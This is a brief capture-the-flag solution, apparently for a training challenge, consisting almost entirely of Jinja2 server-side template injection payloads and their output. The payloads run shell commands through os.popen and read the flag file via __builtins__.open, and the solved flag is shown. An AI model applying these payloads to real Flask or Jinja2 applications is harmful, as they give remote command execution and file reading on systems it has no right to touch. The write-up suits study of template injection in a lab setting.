Test with payload: {{7*'7'}} => 7777777

=> Python

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

=> __pycache__ app.py flag requirements.txt

{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}

=> /challenge 

{{ get_flashed_messages.__globals__.__builtins__.open("/challenge/flag").read() }}

=> academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_5f46e534}
